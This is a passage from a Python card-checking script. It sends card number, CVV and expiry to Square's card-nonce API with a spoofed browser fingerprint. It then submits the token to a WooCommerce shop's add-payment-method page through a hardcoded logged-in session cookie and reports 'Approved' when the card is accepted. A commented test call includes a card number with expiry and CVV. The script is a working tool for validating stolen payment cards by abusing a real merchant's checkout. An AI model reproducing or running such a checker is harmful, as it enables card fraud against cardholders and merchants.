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"},"touch_support":{"maxTouchPoints":5,"touchEvent":true,"touchStart":true},"vendor_flavors":["chrome"],"color_gamut":"srgb","forced_colors":false,"monochrome":0,"contrast":0,"reduced_motion":false,"hdr":false,"math":{"acos":1.4473588658278522,"acosh":709.889355822726,"acoshPf":355.291251501643,"asin":0.12343746096704435,"asinh":0.881373587019543,"asinhPf":0.8813735870195429,"atanh":0.5493061443340548,"atanhPf":0.5493061443340548,"atan":0.4636476090008061,"sin":0.8178819121159085,"sinh":1.1752011936438014,"sinhPf":2.534342107873324,"cos":-0.8390715290095377,"cosh":1.5430806348152437,"coshPf":1.5430806348152437,"tan":-1.4214488238747245,"tanh":0.7615941559557649,"tanhPf":0.7615941559557649,"exp":2.718281828459045,"expm1":1.718281828459045,"expm1Pf":1.718281828459045,"log1p":2.3978952727983707,"log1pPf":2.3978952727983707,"powPI":1.9275814160560204e-50},"pdf_viewer_enabled":false}',
                'fingerprint': 'ec7ac8645abd4036864ef6267720d7da',
                'version': 'fingerprint-v2',
            },
        ],
        'timezone': '-330',
        'website_url': 'https://underthedivi.com/',
    },
    'client_id': 'sq0idp-wGVapF8sNt9PLrdj5znuKA',
    'instance_id': instance_id,
    'location_id': '6JKR6RP4CBRJB',
    'payment_method_tracking_id': avt,
    'session_id': session_id,
    'card_data': {
        'billing_postal_code': '75231',
        'cvv': f'{cvc}',
        'exp_month': exp_month,
        'exp_year': exp_year,
        'number': f'{n}',
    },
    'pow_counter': parm_pow_counter,
}



    response = requests.post(
    'https://pci-connect.squareup.com/v2/card-nonce',
    params=params,
    cookies=cookies,
    headers=headers,
    json=json_data,
)
    print(response.text)

    if response.ok:
        data = response.json()

    # Try to extract values
        try:
            car = data.get("card_nonce", "Not found")
            print("card_nonce:", car)
            card = data.get("card", {})
            brand = card.get("card_brand", "Not found")
            print("card_brand:", brand)
            last = card.get("last_4", "Not found")
            print("last_4:", last)
            mon = card.get("exp_month", "Not found")
            print("exp_month:", mon)
            year = card.get("exp_year", "Not found")
            print("exp_year:", year)
            post = card.get("billing_postal_code", "Not found")
            print("billing_postal_code:",post )
        except Exception as e:
            print("Error parsing response:", e)
    else:
        print("Request failed with status code:", response.status_code)
    


    cookies = {
    '_lscache_vary': 'c5df0945710ad450fafbb2532179b248',
    'wordpress_logged_in_86415392525f8431df4682e51bfa7393': 'kayoda6036%7C1759681607%7CnefDDRP4lF9YdFpe1h1FGC9V9CJMgmWom2Y1BSAmyIp%7C730b8029815195befb5de3d65e0e9d3261c618f2532487eeb206f7de4f1e55be',
    'slimstat_tracking_code': '47594.94f877119cc1fd81423954c24e3a37ac',
}


    headers = {
    'authority': 'underthedivi.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'cache-control': 'max-age=0',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_lscache_vary=c5df0945710ad450fafbb2532179b248; wordpress_logged_in_86415392525f8431df4682e51bfa7393=kayoda6036%7C1759681607%7CnefDDRP4lF9YdFpe1h1FGC9V9CJMgmWom2Y1BSAmyIp%7C730b8029815195befb5de3d65e0e9d3261c618f2532487eeb206f7de4f1e55be; slimstat_tracking_code=47530.a5878a0047bb0cc0bbf0eb5609f0ce44',
    'origin': 'https://underthedivi.com',
    'referer': 'https://underthedivi.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = {
    'payment_method': 'square_credit_card',
    'wc-square-credit-card-card-type': brand,
    'wc-square-credit-card-last-four': last,
    'wc-square-credit-card-exp-month': mon,
    'wc-square-credit-card-exp-year': year,
    'wc-square-credit-card-payment-nonce': car,
    'wc-square-credit-card-payment-postcode': post,
    'wc-square-credit-card-amount': '',
    'wc-square-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': 'b9c9134d89',
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

    response = requests.post('https://underthedivi.com/my-account/add-payment-method/', cookies=cookies, headers=headers, data=data)

   


    soup = BeautifulSoup(response.text, 'html.parser')
    message = soup.select_one('.woocommerce-error li')  # Select error message element

    if message:
        text = message.text.strip()
    else:
        text = response.text.strip()  # fallback to full response if no message found

# Use regex to search for any of the keywords (case insensitive)
    if re.search(r'\b(added|successful|nice)\b', text, re.IGNORECASE):
        print("Approved")
        return "Approved"
    else:
        print(text)
        return text
        
        
#print(sq("4895040585291392|10|27|511"))         
        